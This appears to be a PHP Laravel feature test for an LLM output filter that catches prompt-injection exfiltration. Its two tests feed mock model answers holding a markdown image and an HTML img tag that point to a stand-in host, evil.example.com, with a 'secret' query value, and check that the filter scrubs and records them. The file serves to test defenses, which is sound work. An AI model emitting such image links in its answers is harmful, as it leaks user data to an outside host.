<?php

namespace Tests\Feature;

use App\Models\PromptInjectionSignal;
use App\Models\Workspace;
use App\Services\Llm\OutputFilter;
use App\Services\Llm\StructuredResult;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * End-to-end injection defenses: an exfiltration attempt is both recorded as a
 * signal AND scrubbed out of the answer that reaches the client — detection
 * alone is not enough.
 */
class PromptInjectionTest extends TestCase
{
    use RefreshDatabase;

    private function mkResult(string $answer): StructuredResult
    {
        return new StructuredResult(
            answer: $answer,
            citations: [],
            confidence: 'high',
            tokensIn: 10,
            tokensOut: 10,
            costUsd: 0.0,
            model: 'mock',
        );
    }

    public function test_image_exfil_is_scrubbed_and_recorded(): void
    {
        $workspace = Workspace::create(['name' => 'WS', 'slug' => 'ws-'.uniqid()]);
        $filter = new OutputFilter();

        $out = $filter->check(
            $this->mkResult('Sure — ![pixel](https://evil.example.com/p.png?d=secret) done.'),
            [['id' => 'C1', 'source_url' => 'https://drive.google.com/d/a']],
            [1 => 'C1'],
        );

        $this->assertNotEmpty($out['trips']);
        $this->assertSame('low', $out['result']->confidence);
        $this->assertStringNotContainsString('evil.example.com', $out['result']->answer);

        $filter->recordTrips($workspace, null, $out['trips']);
        $this->assertDatabaseHas('prompt_injection_signals', [
            'workspace_id' => $workspace->id,
            'signal_kind' => PromptInjectionSignal::SIGNAL_IMAGE_TAG,
        ]);
    }

    public function test_html_image_and_protocol_relative_url_are_caught(): void
    {
        $filter = new OutputFilter();

        $out = $filter->check(
            $this->mkResult('Look <img src="//evil.example.com/x.png"> here.'),
            [['id' => 'C1', 'source_url' => 'https://drive.google.com/d/a']],
            [1 => 'C1'],
        );

        $this->assertNotEmpty($out['trips']);
        $this->assertStringNotContainsString('evil.example.com', $out['result']->answer);
    }
}
